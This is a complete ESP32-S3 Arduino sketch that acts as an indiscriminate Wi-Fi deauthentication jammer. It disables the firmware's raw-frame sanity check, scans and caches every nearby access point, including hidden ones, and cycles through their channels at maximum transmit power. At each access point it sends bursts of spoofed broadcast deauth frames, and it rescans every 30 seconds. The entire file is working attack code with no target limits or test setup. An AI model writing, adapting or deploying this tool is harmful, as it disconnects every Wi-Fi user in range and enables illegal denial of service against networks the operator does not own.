#include <WiFi.h>
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

#define DEAUTH_BURST        20      // frames sent per AP per visit
#define DWELL_MS            400     // time spent on each active channel
#define SCAN_INTERVAL_MS    30000   // rescan for APs every 30 s
#define MAX_APS             64

struct TargetAP {
    uint8_t bssid[6];
    uint8_t channel;
};

static TargetAP aps[MAX_APS];
static int apCount = 0;
static unsigned long lastScan = 0;
static uint32_t txOk = 0, txFail = 0;

// 26-byte deauth frame; SA and BSSID are patched per-AP at runtime
static uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // SA:  patched
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID: patched
    0x00, 0x00, 0x07, 0x00                // reason 7 (class-3 frame)
};

void scanTargets() {
    Serial.println("[*] scanning...");
    WiFi.scanNetworks(false, true);        // blocking, include hidden
    int n = WiFi.scanComplete();
    apCount = 0;
    for (int i = 0; i < n && apCount < MAX_APS; i++) {
        uint8_t* b = WiFi.BSSID(i);
        if (!b) continue;
        memcpy(aps[apCount].bssid, b, 6);
        aps[apCount].channel = (uint8_t)WiFi.channel(i);
        apCount++;
    }
    WiFi.scanDelete();
    Serial.printf("[*] %d APs cached\n", apCount);
    lastScan = millis();
}

void deauthOneAP(const uint8_t* bssid) {
    memcpy(&deauthFrame[10], bssid, 6);   // SA = real AP
    memcpy(&deauthFrame[16], bssid, 6);   // BSSID = real AP
    for (int i = 0; i < DEAUTH_BURST; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false) == ESP_OK)
            txOk++;
        else
            txFail++;
    }
}

void setup() {
    Serial.begin(115200);
    delay(300);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);

    // Max TX power (units are 0.25 dBm; 80 = 20 dBm)
    esp_wifi_set_max_tx_power(80);

    Serial.println("[ESP32-S3] jammer active");
    scanTargets();
}

void loop() {
    if (millis() - lastScan > SCAN_INTERVAL_MS) {
        scanTargets();
    }

    // Visit each channel that has at least one cached AP
    for (uint8_t ch = 1; ch <= 13; ch++) {
        bool active = false;
        for (int i = 0; i < apCount; i++) {
            if (aps[i].channel == ch) { active = true; break; }
        }
        if (!active) continue;

        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        for (int i = 0; i < apCount; i++) {
            if (aps[i].channel != ch) continue;
            deauthOneAP(aps[i].bssid);
        }

        delay(DWELL_MS);
    }

    // Status line every 5 seconds
    static unsigned long lastReport = 0;
    if (millis() - lastReport > 5000) {
        Serial.printf("[*] tx ok=%lu fail=%lu aps=%d\n", txOk, txFail, apCount);
        lastReport = millis();
    }
}
